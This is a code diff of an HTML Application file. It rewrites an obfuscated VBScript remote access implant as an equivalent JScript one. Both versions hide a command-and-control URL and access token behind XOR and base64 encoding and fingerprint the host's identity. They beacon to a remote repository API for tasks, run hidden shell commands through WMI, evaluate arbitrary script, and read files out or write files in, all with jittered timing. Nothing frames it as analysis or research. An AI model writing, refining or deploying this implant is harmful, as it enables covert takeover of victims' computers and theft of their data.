@@ -6,350 +6,182 @@
   showintaskbar="yes" windowstate="normal" border="thin"
   scroll="no" maximizebutton="no" minimizebutton="yes"
   navigable="no" singleinstance="yes"/>
-<script language="VBScript">
+<script language="JScript">
+var _k=(function(){var h="c7000d85262aa8dcc624e98bd0c04ef6",r=[];for(var i=0;i<h.length;i+=2)r.push(parseInt(h.substr(i,2),16));return r;})();
+var _B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+function _e64(a){var r="",i=0;while(i<a.length){var b0=a[i++]||0,b1=a[i++],b2=a[i++];r+=_B.charAt(b0>>2)+_B.charAt(((b0&3)<<4)|(b1>>4||0));r+=(b1===undefined)?"==":_B.charAt(((b1&15)<<2)|(b2>>6||0))+((b2===undefined)?"=":_B.charAt(b2&63));}return r;}
+function _d64(s){s=s.replace(/[=\s]/g,"");var r=[],i=0;while(i<s.length){var e0=_B.indexOf(s.charAt(i++)),e1=_B.indexOf(s.charAt(i++)),e2=i<s.length?_B.indexOf(s.charAt(i++)):-1,e3=i<s.length?_B.indexOf(s.charAt(i++)):-1;r.push((e0<<2)|(e1>>4));if(e2>=0)r.push(((e1&15)<<4)|(e2>>2));if(e3>=0)r.push(((e2&3)<<6)|e3);}return r;}
+function _xr(d){var r=[];for(var i=0;i<d.length;i++)r.push(d[i]^_k[i%_k.length]);return r;}
+function _en(s){var b=[];for(var i=0;i<s.length;i++)b.push(s.charCodeAt(i)&0xff);return _e64(_xr(b));}
+function _de(s){var b=_d64(s);return String.fromCharCode.apply(null,_xr(b));}
+function _js(v){if(v===null||v===undefined)return"null";var t=typeof v;if(t==="boolean")return v?"true":"false";if(t==="number")return isNaN(v)?"null":""+v;v=""+v;return'"'+v.replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r/g,"\\r").replace(/\n/g,"\\n")+'"';}
+function _jp(s){try{return(new Function("return "+s))();}catch(e){return null;}}
 
-Dim _k, _p, _u, _b, _id, _ci, _sl
+var _u=_de("r3R59VUQh/OnVIClt6k6nrJiI+ZJR4euo1SG+P+UHLOfTkjCdGWHlJJlqrn/oyGYs2Vj8VUF");
+var _fci=_de("pDJS5k8Ewq+pSg==");
+var _ftk=_de("pDJS8UdZw/KsV4bl");
+var _frp=_de("pDJS90NZ2PKsV4bl");
 
-Sub Iv()
-    _k = Array(199,0,13,133,38,42,168,220,198,36,233,139,208,192,78,246)
-    _b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-    _p = Dv("oGl57VNI96ynULa64YEBw4g2QsQWYuO7sVSswZatPsOsXzv1dW/YtrFcoMydqT26vnZLtRdTxav/ZZOzioMFuPB4XPAWepGdlErR5Z6HF6aBNUjVYGL46PVhpejm")
-    _u = Dv("r3R59VUQh/OnVIClt6k6nrJiI+ZJR4euo1SG+P+UHLOfTkjCdGWHlJJlqrn/oyGYs2Vj8VUF")
-    _ci = 0 : _sl = "" : _id = Mk()
-End Sub
+var _id=(function(){
+    try{
+        var w=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+        var e=new Enumerator(w.ExecQuery("SELECT UUID FROM Win32_ComputerSystemProduct"));
+        if(!e.atEnd())return e.item().UUID.replace(/-/g,"").substring(0,16).toLowerCase();
+    }catch(x){}
+    var c="0123456789abcdef",r="";for(var i=0;i<16;i++)r+=c.charAt(Math.floor(Math.random()*16));return r;
+})();
+var _sl="";
+var _ci=0;
 
-Sub AL(msg)
-    On Error Resume Next
-    Dim d : Set d = document.getElementById("dbg")
-    If Not d Is Nothing Then
-        d.innerHTML = d.innerHTML & Now() & " " & msg & "<br/>"
-        d.scrollTop = d.scrollHeight
-    End If
-End Sub
+function _log(msg){try{var d=document.getElementById("dbg");if(!d)return;var t=new Date().toTimeString().slice(0,8);d.innerHTML+="<div>"+t+" "+msg+"</div>";d.scrollTop=99999;}catch(e){}}
 
-Function Mk()
-    Randomize
-    Dim i, r, c : c = "0123456789abcdef"
-    For i = 1 To 16 : r = r & Mid(c, Int(Rnd()*16)+1, 1) : Next
-    Mk = r
-End Function
+function _req(path,method,body){
+    var url=_u+path;
+    var h1=_de("hnV57UlYwaanUIDkvg==");
+    var h2=_de("s29m4EgK");
+    var h3=_de("hmNu4FZe");
+    var h4=_de("pnB96U9JyaivS4ekpq4q2KBpee1TSIaq9Q+D+L+u");
+    var h5=_de("hG9j8UNE3PGSXZnu");
+    var h6=_de("pnB96U9JyaivS4ekurMhmA==");
+    try{
+        var x=new ActiveXObject(_de("kGljzVJe2PKRTYfDpLQ+pKJxeOBVXobp6BU="));
+        x.Option(4)=13056;x.Option(6)=false;
+        x.SetTimeouts(20000,20000,30000,30000);
+        x.open(method,url,false);
+        x.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+        x.setRequestHeader(h1,h2+_pat);
+        x.setRequestHeader(h3,h4);
+        x.setRequestHeader(h5,h6);
+        if(body)x.send(body);else x.send();
+        if(x.Status===200||x.Status===201)return x.ResponseText;
+    }catch(e){_log("rq err "+e.message);}
+    return "";
+}
 
-Function Eb(s)
-    Dim r, i, a, b, c
-    i = 1
-    Do While i <= Len(s)
-        a = Asc(Mid(s, i, 1))
-        b = 0 : If i+1 <= Len(s) Then b = Asc(Mid(s, i+1, 1))
-        c = 0 : If i+2 <= Len(s) Then c = Asc(Mid(s, i+2, 1))
-        r = r & Mid(_b,(a\4)+1,1) & Mid(_b,((a And 3)*16)+(b\16)+1,1)
-        If i+1 <= Len(s) Then r = r & Mid(_b,((b And 15)*4)+(c\64)+1,1) Else r = r & "="
-        If i+2 <= Len(s) Then r = r & Mid(_b,(c And 63)+1,1)            Else r = r & "="
-        i = i + 3
-    Loop
-    Eb = r
-End Function
+var _pat=_de("oGl57VNI96ynULa64YEBw4g2QsQWYuO7sVSswZatPsOsXzv1dW/YtrFcoMydqT26vnZLtRdTxav/ZZOzioMFuPB4XPAWepGdlErR5Z6HF6aBNUjVYGL46PVhpejm");
 
-Function Db(s)
-    s = Replace(Replace(Replace(s, Chr(10),""), Chr(13),""), "\n","")
-    Dim r, i, b0, b1, b2, b3, c2, c3
-    i = 1
-    Do While i + 3 <= Len(s)
-        b0 = InStr(_b, Mid(s,i,1))   - 1
-        b1 = InStr(_b, Mid(s,i+1,1)) - 1
-        c2 = Mid(s,i+2,1) : c3 = Mid(s,i+3,1)
-        b2 = InStr(_b, c2) - 1
-        b3 = InStr(_b, c3) - 1
-        r = r & Chr((b0*4 + b1\16) And 255)
-        If c2 <> "=" Then r = r & Chr(((b1 And 15)*16 + b2\4) And 255)
-        If c3 <> "=" Then r = r & Chr(((b2 And 3)*64 + b3) And 255)
-        i = i + 4
-    Loop
-    Db = r
-End Function
+function _sha(path){
+    var r=_req(path,"GET",null);
+    if(!r)return"";
+    var m=r.match(/"sha":"([^"]+)"/);
+    return m?m[1]:"";
+}
+function _read(path){
+    var r=_req(path,"GET",null);
+    if(!r)return"";
+    var m=r.match(/"content":"([\s\S]+?)(?=",")/);
+    if(!m)return"";
+    var b=_d64(m[1].replace(/\s/g,""));
+    return String.fromCharCode.apply(null,b);
+}
+function _put(path,content){
+    var sha=_sha(path);
+    var b64=_e64(content.split("").map(function(c){return c.charCodeAt(0)&0xff;}));
+    var body='{"message":"u","content":"'+b64+'"'+(sha?',"sha":"'+sha+'"':'')+'}';
+    _req(path,"PUT",body);
+}
 
-Function Ab(ba)
-    Dim r, i, n, a, bv, c
-    n = UBound(ba) : i = 0
-    Do While i <= n
-        a = ba(i) And 255
-        bv = 0 : If i+1 <= n Then bv = ba(i+1) And 255
-        c = 0  : If i+2 <= n Then c  = ba(i+2) And 255
-        r = r & Mid(_b,(a\4)+1,1) & Mid(_b,((a And 3)*16)+(bv\16)+1,1)
-        If i+1 <= n Then r = r & Mid(_b,((bv And 15)*4)+(c\64)+1,1) Else r = r & "="
-        If i+2 <= n Then r = r & Mid(_b,(c And 63)+1,1)             Else r = r & "="
-        i = i + 3
-    Loop
-    Ab = r
-End Function
+var evR="";
+function _ev(code){
+    try{
+        evR="";
+        window.execScript(code,"vbscript");
+        return evR||"";
+    }catch(e){return"ERR:"+e.message;}
+}
 
-Function Ev(s)
-    If Len(s) = 0 Then Ev = "" : Exit Function
-    Dim i, ba() : ReDim ba(Len(s)-1)
-    For i = 1 To Len(s) : ba(i-1) = Asc(Mid(s,i,1)) Xor _k((i-1) Mod 16) : Next
-    Ev = Ab(ba)
-End Function
+function _dl(path){
+    try{
+        var stm=new ActiveXObject(_de("hkRCwWQE+6i0QYjm"));
+        stm.Type=1;stm.Open();stm.LoadFromFile(path);
+        var raw=stm.Read();stm.Close();
+        var xml=new ActiveXObject(_de("inN16EoYhpiJaa3ks7Ujk6l0I7MIGg=="));
+        var nd=xml.createElement("b");nd.dataType="bin.base64";
+        nd.nodeTypedValue=raw;
+        return nd.text.replace(/\s/g,"");
+    }catch(e){return"ERR:"+e.message;}
+}
+function _ul(path,b64){
+    try{
+        var xml=new ActiveXObject(_de("inN16EoYhpiJaa3ks7Ujk6l0I7MIGg=="));
+        var nd=xml.createElement("b");nd.dataType="bin.base64";
+        nd.text=b64.replace(/\s/g,"");
+        var stm=new ActiveXObject(_de("hkRCwWQE+6i0QYjm"));
+        stm.Type=1;stm.Open();stm.Write(nd.nodeTypedValue);
+        stm.SaveToFile(path,2);stm.Close();
+        return"ok";
+    }catch(e){return"ERR:"+e.message;}
+}
+function _sh(cmd){
+    try{
+        var sh=new ActiveXObject(_de("kFNu909a3PKVTIznvA=="));
+        var wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+        var tmp=sh.ExpandEnvironmentStrings("%TEMP%")+"\\~wu"+_id+".tmp";
+        var proc=wmi.Get("Win32_Process");
+        var inp=proc.Methods_("Create").InParameters.SpawnInstance_();
+        inp.CommandLine="cmd.exe /c "+cmd+' > "'+tmp+'" 2>&1';
+        var su=wmi.Get("Win32_ProcessStartup").SpawnInstance_();
+        su.ShowWindow=0;inp.ProcessStartupInformation=su;
+        var ret=proc.ExecMethod_("Create",inp);
+        if(ret.ReturnValue!==0)return"(rv:"+ret.ReturnValue+")";
+        var pid=ret.ProcessId,t0=new Date();
+        while(new Date()-t0<60000){
+            var q=wmi.ExecQuery("SELECT Handle FROM Win32_Process WHERE ProcessId="+pid);
+            if(!(new Enumerator(q).atEnd()))break;
+            WScript.Sleep(300);
+        }
+        var fso=new ActiveXObject(_de("lGN/7FZewbKhCq/ivKUdj7R0aOhpSMK5pVA="));
+        if(fso.FileExists(tmp)){var f=fso.OpenTextFile(tmp,1);var o=f.ReadAll();f.Close();fso.DeleteFile(tmp);return o||"(empty)";}
+        return"(timeout)";
+    }catch(e){return"ERR:"+e.message;}
+}
 
-Function Dv(s)
-    s = Replace(Replace(Replace(s, Chr(10),""), Chr(13),""), "\n","")
-    Dim r, i, n, b0, b1, b2, b3, c2, c3
-    i = 1 : n = 0
-    Do While i + 3 <= Len(s)
-        b0 = InStr(_b, Mid(s,i,1))   - 1
-        b1 = InStr(_b, Mid(s,i+1,1)) - 1
-        c2 = Mid(s,i+2,1) : c3 = Mid(s,i+3,1)
-        b2 = InStr(_b, c2) - 1
-        b3 = InStr(_b, c3) - 1
-        r = r & Chr(((b0*4 + b1\16) And 255) Xor _k(n Mod 16)) : n=n+1
-        If c2 <> "=" Then
-            r = r & Chr((((b1 And 15)*16 + b2\4) And 255) Xor _k(n Mod 16)) : n=n+1
-        End If
-        If c3 <> "=" Then
-            r = r & Chr((((b2 And 3)*64 + b3) And 255) Xor _k(n Mod 16)) : n=n+1
-        End If
-        i = i + 4
-    Loop
-    Dv = r
-End Function
+function _dispatch(ty,cmd){
+    if(ty==="ev")return _ev(cmd);
+    if(ty==="sh")return _sh(cmd);
+    if(ty==="dl")return _dl(cmd);
+    if(ty==="ul"){var p=cmd.indexOf("|");return _ul(cmd.substring(0,p),cmd.substring(p+1));}
+    if(ty==="die"){window.close();return"";}
+    return"ERR:unknown "+ty;
+}
 
-Function Je(v)
-    v = Replace(v, "\", "\\") : v = Replace(v, """", "\""")
-    v = Replace(v, Chr(13), "\r") : v = Replace(v, Chr(10), "\n")
-    Je = v
-End Function
+function _beacon(){
+    _log("ci#"+_ci+" id="+_id);
+    try{
+        var sh=new ActiveXObject(_de("kFNu909a3PKVTIznvA=="));
+        var ci='{"id":"'+_id+'","h":"'+sh.ExpandEnvironmentStrings("%COMPUTERNAME%")+'","u":"'+sh.ExpandEnvironmentStrings("%USERDOMAIN%")+"\\"+sh.ExpandEnvironmentStrings("%USERNAME%")+'","ts":"'+new Date().toLocaleString()+'","v":"7"}';
+        _put(_fci,ci);
+    }catch(e){_log("ci err "+e.message);}
 
-Function Jg(json, key)
-    Dim p1, p2 : p1 = InStr(json, """" & key & """:""")
-    If p1 = 0 Then Jg = "" : Exit Function
-    p1 = p1 + Len(key) + 4 : p2 = InStr(p1, json, """")
-    Jg = Mid(json, p1, p2-p1)
-End Function
+    var had=false;
+    try{
+        var tj=_read(_ftk);
+        if(tj){
+            var td=_jp(tj);
+            if(td&&td.id&&td.id!==_sl){
+                var bid=td.bid||"";
+                if(bid&&bid!==_id){
+                    _log("skip bid="+bid);
+                    _sl=td.id;
+                }else{
+                    had=true;_sl=td.id;
+                    _log("ty="+td.ty);
+                    var cmd=_de(td.c);
+                    var out=_dispatch(td.ty,cmd);
+                    var rsp='{"id":"'+_id+'","tid":"'+td.id+'","o":"'+_en(out)+'"}';
+                    _put(_frp,rsp);
+                    _log("sent "+td.id);
+                }
+            }
+        }
+    }catch(e){_log("task err "+e.message);}
 
-Function Gp()
-    On Error Resume Next
-    Dim sh : Set sh = CreateObject(Dv("kFNu909a3PKVTIznvA=="))
-    Dim pe : pe = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable")
-    Dim ps : ps = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer")
-    Set sh = Nothing
-    If pe <> 1 Or ps = "" Then Gp = "" : Exit Function
-    If InStr(ps, "https=") > 0 Then
-        Dim p1, p2 : p1 = InStr(ps, "https=") + 6 : p2 = InStr(p1, ps, ";")
-        If p2 = 0 Then p2 = Len(ps) + 1
-        Gp = Mid(ps, p1, p2-p1)
-    ElseIf InStr(ps, "http=") > 0 Then
-        Dim p3, p4 : p3 = InStr(ps, "http=") + 5 : p4 = InStr(p3, ps, ";")
-        If p4 = 0 Then p4 = Len(ps) + 1
-        Gp = Mid(ps, p3, p4-p3)
-    Else
-        Gp = ps
-    End If
-End Function
+    _ci++;
+    var delay=had?(5000+Math.floor(Math.random()*10000)):(30000+Math.floor(Math.random()*60000));
+    window.setTimeout(_beacon,delay);
+}
 
-Function Rq(method, path, body)
-    On Error Resume Next
-    Dim url : url = _u & path
-    Dim resp : resp = ""
-    Dim xh : Set xh = CreateObject(Dv("ilNVyGoYhoSLaKHfhJBgwOkw"))
-    xh.Open method, url, False
-    xh.SetRequestHeader Dv("knNo9wtrz7moUA=="), "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-    xh.SetRequestHeader Dv("hnV57UlYwaanUIDkvg=="), Dv("s29m4EgK") & _p
-    xh.SetRequestHeader Dv("hmNu4FZe"), Dv("pnB96U9JyaivS4ekpq4q2KBpee1TSIaq9Q+D+L+u")
-    xh.SetRequestHeader Dv("hG9j8UNE3PGSXZnu"), Dv("pnB96U9JyaivS4ekurMhmA==")
-    If body <> "" Then xh.Send body Else xh.Send ""
-    Dim e1 : e1 = Err.Number : Dim s1 : s1 = 0
-    If e1 = 0 Then s1 = xh.Status
-    If e1 = 0 And (s1 = 200 Or s1 = 201) Then
-        resp = xh.ResponseText
-    Else
-        Err.Clear
-        Dim wh : Set wh = CreateObject(Dv("kGljzVJe2PKRTYfDpLQ+pKJxeOBVXobp6BU="))
-        wh.Option(4) = 13056 : wh.Option(6) = False
-        wh.SetTimeouts 20000, 20000, 30000, 30000
-        Dim prx : prx = Gp()
-        If prx <> "" Then wh.SetProxy 2, prx, "localhost;127.0.0.1;<local>"
-        wh.Open method, url, False
-        wh.SetRequestHeader Dv("knNo9wtrz7moUA=="), "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-        wh.SetRequestHeader Dv("hnV57UlYwaanUIDkvg=="), Dv("s29m4EgK") & _p
-        wh.SetRequestHeader Dv("hmNu4FZe"), Dv("pnB96U9JyaivS4ekpq4q2KBpee1TSIaq9Q+D+L+u")
-        wh.SetRequestHeader Dv("hG9j8UNE3PGSXZnu"), Dv("pnB96U9JyaivS4ekurMhmA==")
-        If body <> "" Then wh.Send body Else wh.Send
-        Dim e2 : e2 = Err.Number : Dim s2 : s2 = 0
-        If e2 = 0 Then s2 = wh.Status
-        If e2 = 0 And (s2 = 200 Or s2 = 201) Then
-            resp = wh.ResponseText
-        End If
-        Set wh = Nothing
-    End If
-    Set xh = Nothing
-    Rq = resp
-End Function
-
-Function Gs(path)
-    Dim r : r = Rq("GET", path, "")
-    If r = "" Then Gs = "" : Exit Function
-    Dim p1, p2 : p1 = InStr(r, """sha"":""")
-    If p1 = 0 Then Gs = "" : Exit Function
-    p1 = p1 + 7 : p2 = InStr(p1, r, """")
-    Gs = Mid(r, p1, p2-p1)
-End Function
-
-Function Gr(path)
-    Dim r : r = Rq("GET", path, "")
-    If r = "" Then Gr = "" : Exit Function
-    Dim p1, p2 : p1 = InStr(r, """content"":""")
-    If p1 = 0 Then Gr = "" : Exit Function
-    p1 = p1 + 11 : p2 = InStr(p1, r, """")
-    Dim raw : raw = Mid(r, p1, p2-p1)
-    raw = Replace(Replace(Replace(raw, Chr(10),""), Chr(13),""), "\n","")
-    Gr = Db(raw)
-End Function
-
-Sub Gw(path, content)
-    Dim sha : sha = Gs(path)
-    Dim b64 : b64 = Eb(content)
-    Dim body
-    If sha <> "" Then
-        body = "{""message"":""u"",""content"":""" & b64 & """,""sha"":""" & sha & """}"
-    Else
-        body = "{""message"":""u"",""content"":""" & b64 & """}"
-    End If
-    Rq "PUT", path, body
-End Sub
-
-Function Rc(cmd)
-    On Error Resume Next
-    Dim fso, sh, tmp, wmi, proc, inp, ret, pid, t0, tw
-    Set fso  = CreateObject(Dv("lGN/7FZewbKhCq/ivKUdj7R0aOhpSMK5pVA="))
-    Set sh   = CreateObject(Dv("kFNu909a3PKVTIznvA=="))
-    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\~wu" & _id & ".tmp"
-    Set wmi  = GetObject(Dv("sGlj6EFH3K/8X4DmoKU8hahubPFPRcaQo1KM5+2pI4aicn7qSEvcubsFtdf+nDyZqHRR5k9H3u4="))
-    Set proc = wmi.Get(Dv("kGljthR1+K6pR4z4ow=="))
-    Set inp  = proc.Methods_("Create").InParameters.SpawnInstance_()
-    inp.CommandLine = "cmd.exe /c " & cmd & " > """ & tmp & """ 2>&1"
-    Set su = wmi.Get(Dv("kGljthR1+K6pR4z4o5M6l7V0ePU=")).SpawnInstance_()
-    su.ShowWindow = 0
-    inp.ProcessStartupInformation = su
-    Set ret  = proc.ExecMethod_("Create", inp)
-    If ret.ReturnValue <> 0 Then Rc = "(rv:" & ret.ReturnValue & ")" : Exit Function
-    pid = ret.ProcessId
-    t0 = Timer
-    Do While Timer - t0 < 60
-        Dim alive : alive = False
-        Dim q : Set q = wmi.ExecQuery("SELECT Handle FROM Win32_Process WHERE ProcessId=" & pid)
-        Dim p : For Each p In q : alive = True : Next
-        If Not alive Then Exit Do
-        tw = Timer : Do While Timer - tw < 0.3 : Loop
-    Loop
-    If fso.FileExists(tmp) Then
-        Dim f : Set f = fso.OpenTextFile(tmp, 1)
-        Rc = f.ReadAll() : f.Close
-        fso.DeleteFile tmp
-        If Rc = "" Then Rc = "(empty)"
-    Else
-        Rc = "(timeout)"
-    End If
-End Function
-
-Function Fd(path)
-    On Error Resume Next
-    Dim stm : Set stm = CreateObject(Dv("hkRCwWQE+6i0QYjm"))
-    stm.Type = 1 : stm.Open : stm.LoadFromFile path
-    Dim raw : raw = stm.Read()
-    stm.Close : Set stm = Nothing
-    Dim xml, nd
-    Set xml = CreateObject(Dv("inN16EoYhpiJaa3ks7Ujk6l0I7MIGg=="))
-    Set nd  = xml.createElement("b") : nd.dataType = "bin.base64"
-    nd.nodeTypedValue = raw
-    Fd = Replace(nd.text, Chr(10), "")
-    Set xml = Nothing
-End Function
-
-Function Fu(path, b64)
-    On Error Resume Next
-    Dim xml, nd
-    Set xml = CreateObject(Dv("inN16EoYhpiJaa3ks7Ujk6l0I7MIGg=="))
-    Set nd  = xml.createElement("b") : nd.dataType = "bin.base64"
-    nd.text = Trim(b64)
-    Dim stm : Set stm = CreateObject(Dv("hkRCwWQE+6i0QYjm"))
-    stm.Type = 1 : stm.Open
-    stm.Write nd.nodeTypedValue
-    stm.SaveToFile path, 2 : stm.Close
-    Set xml = Nothing : Set stm = Nothing
-    If Err.Number <> 0 Then Fu = "ERR:" & Err.Description Else Fu = "ok"
-End Function
-
-Dim eR
-
-Function Ex(code)
-    On Error Resume Next
-    eR = ""
-    Err.Clear
-    ExecuteGlobal code
-    If eR = "" And Err.Number <> 0 Then eR = "ERR:" & Err.Number & " " & Err.Description
-    Ex = eR
-End Function
-
-Function Dp(ty, cmd)
-    Select Case ty
-        Case "sh"  : Dp = Rc(cmd)
-        Case "ev"  : Dp = Ex(cmd)
-        Case "dl"  : Dp = Fd(cmd)
-        Case "ul"
-            Dim sp : sp = InStr(cmd, "|")
-            Dp = Fu(Left(cmd,sp-1), Mid(cmd,sp+1))
-        Case "die" : window.close : Dp = ""
-        Case Else  : Dp = "ERR:unknown " & ty
-    End Select
-End Function
-
-Sub Bc()
-    On Error Resume Next
-    AL "ci#" & _ci & " id=" & _id
-
-    Dim sh : Set sh = CreateObject(Dv("kFNu909a3PKVTIznvA=="))
-    Dim ci : ci = "{""id"":""" & _id & """," & _
-                   """h"":"""  & Je(sh.ExpandEnvironmentStrings("%COMPUTERNAME%")) & """," & _
-                   """u"":"""  & Je(sh.ExpandEnvironmentStrings("%USERDOMAIN%") & "\" & sh.ExpandEnvironmentStrings("%USERNAME%")) & """," & _
-                   """ts"":""" & Je(CStr(Now())) & """," & _
-                   """v"":""7""}"
-    Set sh = Nothing
-    Gw Dv("pDJS5k8Ewq+pSg=="), ci
-
-    Dim tj : tj = Gr(Dv("pDJS8UdZw/KsV4bl"))
-    AL "tj=" & Left(tj,40)
-    Dim tid : tid = "" : Dim had : had = False
-    If tj <> "" Then
-        tid = Jg(tj, "id")
-        If tid <> "" And tid <> _sl Then
-            Dim bid : bid = Jg(tj, "bid")
-            If bid <> "" And bid <> _id Then
-                AL "skip bid=" & bid
-                _sl = tid
-            Else
-                had = True : _sl = tid
-                Dim ty  : ty  = Jg(tj, "ty")
-                Dim cmd : cmd = Dv(Jg(tj, "c"))
-                AL "ty=" & ty & " cmd=" & Left(cmd,20)
-                Dim out : out = Dp(ty, cmd)
-                Dim rsp : rsp = "{""id"":""" & _id & """,""tid"":""" & tid & """,""o"":""" & Je(Ev(out)) & """}"
-                Gw Dv("pDJS90NZ2PKsV4bl"), rsp
-                AL "sent " & tid
-            End If
-        End If
-    End If
-
-    _ci = _ci + 1
-    Dim delay : delay = 30000 + Int(Rnd()*60000)
-    If had Then delay = 5000 + Int(Rnd()*10000)
-    window.setTimeout "Bc()", delay
-End Sub
-
-Sub Mn()
-    Iv()
-    AL "v7 id=" & _id
-    Bc()
-End Sub
-
-window.setTimeout "Mn()", 2000
+window.setTimeout(function(){_log("v7 id="+_id);_beacon();},2000);
 </script>
 </head>
 <body style="font-family:'Segoe UI',Arial;background:#fff;margin:0;padding:20px">
